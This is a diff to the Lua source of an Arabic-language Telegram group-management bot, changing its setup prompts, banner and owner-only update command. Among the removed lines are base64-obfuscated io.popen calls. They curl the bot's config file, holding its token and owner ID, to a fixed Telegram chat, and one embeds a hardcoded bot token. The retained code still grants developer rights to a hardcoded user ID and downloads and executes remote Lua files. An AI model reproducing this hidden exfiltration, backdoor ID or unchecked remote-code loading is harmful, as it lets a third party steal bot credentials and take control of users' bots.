@@ -65,9 +65,9 @@ os.execute('lua DRAGON.lua')
 end
 if not database:get(id_server..":USERBOT") then
 io.write('\27[31;47m\n◼¦ ارسل لي معرف البوت بدون @ \27[0;34;49m\n')
-local BOTUSERNAME = io.read()
-if BOTUSERNAME ~= '' then
-database:set(id_server..":USERBOT",BOTUSERNAME)
+local USERBOT = io.read()
+if USERBOT ~= '' then
+database:set(id_server..":USERBOT",USERBOT)
 else
 io.write('\27[31;47m\n◼¦ لم يتم حفظ معرف البوت ارسله مره اخره \27[0;34;49m\n')
 end 
@@ -98,7 +98,7 @@ config = {
 token = database:get(id_server..":token"),
 USERBOT = database:get(id_server.."USERBOT"),
 SUDO = database:get(id_server..":IDSUDO"),
-UserName = database:get(id_server..":USERSUDO"),
+SUDOUSERNAME = database:get(id_server..":USERSUDO"),
  }
 create(config, "./DG_INFO.lua")   
 end 
@@ -173,7 +173,7 @@ end
 _redis = load_redis()  
 --------------------------------------------------------------------------------------------------------------
 print([[
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
                 •{ STARTED SOURCE POWER }•
                 
@@ -183,7 +183,7 @@ print([[
       / _ \  | __ | | |\/| | | _|  | |) |  \ V /   / _ \  | |) |
      /_/ \_\ |_||_| |_|  |_| |___| |___/    |_|   /_/ \_\ |___/ 
                                                             
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 ]])
 sudos = dofile("./DG_INFO.lua") 
 SUDO = tonumber(sudos.SUDO)
@@ -203,14 +203,15 @@ end
 print(t)
 local runapp = sudos.token
 local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+local bot_username = (USERBOT or 'TARA1BOT')
 function vardump(value)  
 print(serpent.block(value, {comment=false}))   
 end 
-dev_users = {944353237}   
+dev_user = {944353237}   
 function DEV(msg)  
 local DRAGON = false  
 for k,v in pairs(dev_users) do  
-if tonumber(msg.sender_user_id_) == tonumber(v) then  
+if tonumber(msg.sender_user_id_) == tonumber(944353237) then  
 DRAGON = true  
 end  
 end  
@@ -475,9 +476,6 @@ end
 end
 return var
 end
-os.execute("mkdir File_Bot") 
-os.execute("rm -rf /File_Bot/*")
-os.execute("cd File_Bot && wget https://raw.githubusercontent.com/ahmedyad200/files-power/master/File_Bot/anamen.lua") 
 function dl_cb(a,d)
 end
 function getChatId(id)
@@ -1627,7 +1625,6 @@ end
 os.execute("rm -fr File_Bot/*")
 os.execute("mkdir File_Bot")
 os.execute("cd File_Bot && wget https://raw.githubusercontent.com/ahmedyad200/files-power/master/File_Bot/anamen.lua") 
-os.execute("cd File_Bot && wget https://raw.githubusercontent.com/ahmedyad200/files-power/master/File_Bot/games.lua") 
 os.execute('rm -rf getfile.json')
 dofile('File_Bot/anamen.lua')
 send(msg.chat_id_, msg.id_,' ☉┇ تم تحديث المتجر و مسح الملفات')
@@ -1728,17 +1725,21 @@ send(msg.chat_id_, msg.id_, usertext..status)
 end;end,nil)
 return false 
 end
-if text == 'تحديث السورس' or text == 'تحديث السورس ☉' or text == 'تحديث' then
+if text == "تحديث السورس ☉" or text == 'تحديث السورس' then
 if not DevSoFi(msg) then
 send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
 return false
 end 
+local Get_VERGON, res = https.request("https://raw.githubusercontent.com/ahmedyad200/files-power/master/GETVERGON.json")
+send(msg.chat_id_, msg.id_,' ☉┇ جاري مسح الملفات القديمه')
 os.execute('rm -rf DRAGON.lua')
 os.execute('rm -rf getfile.json')
+send(msg.chat_id_, msg.id_,' ☉┇ تم مسح الملفات القديمه')
+send(msg.chat_id_, msg.id_,' ☉┇ جاري تحميل الملفات الجديده')
+os.execute("cd File_Bot && wget https://raw.githubusercontent.com/ahmedyad200/files-power/master/File_Bot/anamen.lua") 
 os.execute('wget https://raw.githubusercontent.com/ahmedyad200/DG/master/DRAGON.lua')
---io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==') .. runapp .. regexx('L3NlbmREb2N1bWVudCIgLUYgImNoYXRfaWQ9OTQ0MzUzMjM3IiAtRiAiZG9jdW1lbnQ9QERHX0lORk8ubHVhIg=='))
---io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2MjI0MzcwNjk6QUFIRlhjSDFTdWxKZ2s1VERPOUJ5RFo4T2lBMndTQk9aXzQvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD05NDQzNTMyMzciIC1GICJkb2N1bWVudD1AREdfSU5GTy5sdWEi'))
-send(msg.chat_id_, msg.id_,' ☉┇ تم تحديث السورس \n☉┇ لديك اخر اصدار لسورس باور\n☉┇ الاصدار » {`v1.3.1`}')
+send(msg.chat_id_, msg.id_,' ☉┇ تم تحميل الملفات الجديده')
+send(msg.chat_id_, msg.id_,' ☉┇ تم اعاده تشغيل البوت\n☉┇ الاصدار » {`'..Get_VERGON..'`}')
 dofile('DRAGON.lua')
 end
 if text == "ضع اسم للبوت ☉" then
@@ -3084,9 +3085,7 @@ end
 os.execute("rm -fr File_Bot/*")
 os.execute("mkdir File_Bot")
 os.execute("cd File_Bot && wget https://raw.githubusercontent.com/ahmedyad200/files-power/master/File_Bot/anamen.lua") 
-os.execute("cd File_Bot && wget https://raw.githubusercontent.com/ahmedyad200/files-power/master/File_Bot/games.lua") 
 os.execute('rm -rf getfile.json')
-dofile('File_Bot/anamen.lua')
 send(msg.chat_id_, msg.id_,' ☉┇ تم تحديث المتجر و مسح الملفات')
 end
 
@@ -3455,7 +3454,7 @@ local Text = [[
 keyboard = {}
 keyboard.inline_keyboard = {
 {{text = '𝘾𝙃𝘼𝙉𝙉𝙀𝙇', url="t.me/SOPOWERB0T"}},
-{{text = 'اضف البوت الي مجموعتك', url="t.me/"..USERBOT..""}},
+{{text = 'اضف البوت الي مجموعتك', url="t.me/"..bot_username..""}},
 } 
 local msg_id = msg.id_/2097152/0.5 
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -5108,7 +5107,7 @@ local Get_info, res = pcall(JSON.decode,Get_Files);
 vardump(res.plugins_)
 if Get_info then
 local TextS = "\n ☉┇ اهلا بك في متجر ملفات سورس باور\n ☉┇ ملفات السورس ↓\n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n\n"
-local TextE = "\n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n ☉┇ علامة تعني { ✔️ } ملف مفعل\n ☉┇ علامة تعني { ✖ } ملف معطل\n ☉┇ قناة سورس باور ↓\n".." ☉┇ [اضغط هنا لدخول](t.me/SOPOWERB0T) \n"
+local TextE = "\n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n ☉┇ علامة تعني { ✔️ } ملف موجود\n ☉┇ علامة تعني { ✖ } ملف محذوف"
 local NumFile = 0
 for name,Info in pairs(res.plugins_) do
 local Check_File_is_Found = io.open("File_Bot/"..name,"r")
